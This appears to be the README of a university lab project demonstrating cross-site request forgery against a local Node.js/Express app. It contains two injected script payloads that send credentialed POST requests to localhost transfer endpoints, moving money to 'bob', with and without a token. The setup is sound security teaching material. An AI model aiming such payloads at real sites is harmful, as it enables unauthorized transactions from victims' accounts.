# CSRF-attack

CSRF is a type of malicious exploit of a website where unauthorized commands are transmitted 
from a user that the web application trusts.

## Getting Started

Clone the project to your computer.

### Prerequisites

install webstorm .

### Installing

Install nodejs and express .

## Running 

Run the project . 
Run XSS attack with the following scripts:

### without token:
```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
</script><script>$.ajax({type: 'POST',url: 'http://localhost:3000/transfer',data:
{'dest':'bob','amount':'600'},xhrFields:{ withCredentials: true},success:function(msg){}});</script>
```
### with token:
```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>$.ajax({type: 'POST',url: 'http://localhost:3000/tokenTransfer',crossDomain: true,
data:{'dest':'bob','amount':'600'},xhrFields:{ withCredentials: true},success:function(msg){}});</script>

```
 
 ## Authors

* **Galit Vaknin** - [Galit1321](https://github.com/Galit1321)

* **Ifat Neumann** - [neumani1](https://github.com/neumani1)

* **Michal Shawat** - [michalShawat](https://github.com/michalShawat)

## Acknowledgments

* The BIU Center for Research in Applied Cryptography and Cyber Security in Bar-Ilan University
